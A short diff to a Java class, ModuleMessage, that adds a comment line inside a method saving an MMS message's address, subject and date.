@@ -121,6 +121,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	private void saveMms(Mms mms) {
 		final String address = mms.getAddress();
+		// MMS Subject: 
 		final byte[] subject = WChar.getBytes(Messages.getString("10.1") + mms.getSubject()); //$NON-NLS-1$
 		final long date = mms.getDate();
 		final DateTime filetime = new DateTime(date);
